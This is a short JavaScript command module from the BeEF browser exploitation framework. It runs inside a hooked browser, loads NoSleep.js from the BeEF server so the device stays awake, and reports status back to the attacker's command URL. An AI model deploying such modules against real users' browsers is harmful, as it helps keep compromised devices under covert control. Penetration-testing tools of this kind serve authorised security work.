//
// Copyright (c) 2006-2018 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

  enableNoSleep = function() {
    var noSleep = new NoSleep();
    noSleep.enable();
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=NoSleep initiated');
    document.removeEventListener('touchstart', enableNoSleep, false);
  }

  init = function() {
    document.addEventListener('touchstart', enableNoSleep, false);
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=waiting for user input');
  }

  if (typeof NoSleep == "undefined") {
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/NoSleep.js';
    $j("body").append(script);
    setTimeout(init(), 5000);
  }

});

